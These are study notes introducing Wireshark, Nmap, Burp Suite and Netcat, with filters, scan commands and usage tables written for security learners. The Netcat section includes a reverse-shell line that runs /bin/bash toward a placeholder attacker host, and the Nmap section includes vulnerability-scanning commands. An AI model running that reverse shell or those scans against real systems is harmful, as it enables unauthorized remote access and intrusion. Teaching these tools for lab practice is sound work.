# Tool Familiarization — Study Notes

---

## 1. Wireshark (Packet Capture)

**Wireshark** is a free, open-source network protocol analyzer used to capture and inspect traffic flowing across a network in real time.

### Core Concepts
- Captures raw packets from a selected network interface and decodes them layer-by-layer (matching the OSI model).
- Displays traffic in three panes: **packet list**, **packet details** (protocol breakdown), and **packet bytes** (raw hex/ASCII).
- Useful for troubleshooting, learning protocols, and detecting suspicious traffic.

### Key Features
| Feature | Purpose |
|---|---|
| Capture filters | Limit what's captured *before* capture starts (e.g., `host 192.168.1.5`) |
| Display filters | Filter *already captured* traffic for analysis (e.g., `http`, `tcp.port == 80`) |
| Follow TCP Stream | Reconstructs a full conversation between two hosts |
| Statistics menu | Protocol hierarchy, conversations, I/O graphs |

### Common Display Filters
```
ip.addr == 192.168.1.10       # traffic to/from a specific IP
tcp.port == 443                # traffic on a specific port
http                            # only HTTP traffic
dns                              # only DNS queries/responses
tcp.flags.syn == 1 && tcp.flags.ack == 0   # SYN packets only (scan detection)
```

### Typical Use Cases
- Analyzing unencrypted protocols (HTTP, FTP, Telnet) to see data in plaintext.
- Diagnosing slow or failing connections.
- Detecting ARP spoofing, port scans, or unusual traffic patterns.

> **Note:** Wireshark requires the capture interface to be in **promiscuous mode** to see all traffic on a segment, not just traffic addressed to your machine.

---

## 2. Nmap (Network Scanning)

**Nmap** (Network Mapper) is the industry-standard tool for network discovery and security auditing — used to find live hosts, open ports, running services, and OS details.

### Core Scan Types
| Command | Purpose |
|---|---|
| `nmap 192.168.1.1` | Basic scan of a single host |
| `nmap 192.168.1.0/24` | Scan an entire subnet |
| `nmap -sn 192.168.1.0/24` | Ping scan — discover live hosts only, no port scan |
| `nmap -sS target` | SYN ("stealth") scan — fast, doesn't complete full TCP handshake |
| `nmap -sT target` | Full TCP connect scan |
| `nmap -sU target` | UDP scan |
| `nmap -p 1-1000 target` | Scan a specific port range |
| `nmap -p- target` | Scan **all** 65535 ports |

### Service & OS Detection
```
nmap -sV target          # detect service versions running on open ports
nmap -O target            # attempt OS fingerprinting
nmap -A target             # aggressive scan: OS, version, script scanning, traceroute
```

### Nmap Scripting Engine (NSE)
```
nmap --script vuln target       # run vulnerability-detection scripts
nmap --script default target    # run default safe scripts
```

### Output Formats
```
nmap -oN output.txt target      # normal text output
nmap -oX output.xml target      # XML output
```

> **Legal reminder:** Only scan systems you own or have explicit written permission to test — unauthorized scanning can be illegal even without exploitation.

---

## 3. Burp Suite (Web Proxy)

**Burp Suite** is an intercepting proxy and web application security testing toolkit, widely used for manual and automated web app penetration testing.

### Core Concept
- Sits **between your browser and the target web application** as a man-in-the-middle proxy, letting you view, intercept, and modify HTTP/HTTPS requests and responses in real time.

### Key Modules
| Module | Purpose |
|---|---|
| **Proxy** | Intercept and modify live HTTP/HTTPS traffic |
| **Repeater** | Manually resend and tweak individual requests to test responses |
| **Intruder** | Automate customized attacks (e.g., brute force, fuzzing parameters) |
| **Target/Scope** | Define which hosts/URLs are in-scope for testing |
| **Scanner** *(Pro version)* | Automated vulnerability scanning |
| **Decoder** | Encode/decode data (Base64, URL encoding, hex, etc.) |
| **Comparer** | Diff two requests/responses to spot differences |

### Basic Setup Workflow
1. Launch Burp Suite and start its embedded proxy (default `127.0.0.1:8080`).
2. Configure your browser (or use Burp's built-in browser) to route traffic through this proxy.
3. Install Burp's CA certificate in your browser to intercept HTTPS traffic without warnings.
4. Browse the target web app — requests appear in the **Proxy → HTTP History** tab.
5. Send interesting requests to **Repeater** to manually manipulate and resend them.

### Typical Use Cases
- Testing for SQL injection, XSS, and other web vulnerabilities by modifying request parameters.
- Analyzing how an application handles authentication, sessions, and cookies.
- Fuzzing input fields with Intruder to find unexpected behavior.

---

## 4. Netcat (Network Debugging)

**Netcat** (often called the "Swiss Army knife of networking") is a versatile command-line tool for reading and writing data across network connections using TCP or UDP.

### Core Modes

**Listen mode (server):**
```
nc -lvp 4444          # listen on port 4444 (verbose)
```

**Connect mode (client):**
```
nc target_ip 4444      # connect to a listening host on port 4444
```

### Common Use Cases

| Use Case | Command |
|---|---|
| **Port scanning (basic)** | `nc -zv target_ip 20-100` |
| **Banner grabbing** | `nc target_ip 80` then type `HEAD / HTTP/1.0` |
| **File transfer (receiver)** | `nc -lvp 4444 > received_file.txt` |
| **File transfer (sender)** | `nc target_ip 4444 < file_to_send.txt` |
| **Simple chat between two hosts** | Listener: `nc -lvp 4444`; Sender: `nc target_ip 4444` |
| **Reverse shell (lab practice only)** | Listener: `nc -lvp 4444`; Target: `nc attacker_ip 4444 -e /bin/bash` |

### Flag Reference
| Flag | Meaning |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-p` | Specify port |
| `-z` | Zero-I/O mode (used for scanning, no data sent) |
| `-n` | Skip DNS lookups (numeric IPs only) |
| `-e` | Execute a program on connection (security-sensitive — often disabled by default in modern builds) |

> **Ethical note:** Reverse shell examples should only be practiced in your isolated lab environment (e.g., against Metasploitable2), never on systems you don't own or lack permission to test.

---

## 5. Quick Summary Table

| Tool | Category | Primary Use |
|---|---|---|
| **Wireshark** | Packet Analysis | Capture and inspect live network traffic |
| **Nmap** | Network Scanning | Discover hosts, open ports, and services |
| **Burp Suite** | Web Proxy | Intercept and manipulate web app traffic |
| **Netcat** | Network Debugging | Read/write raw TCP/UDP connections, transfer files, banner grabbing |
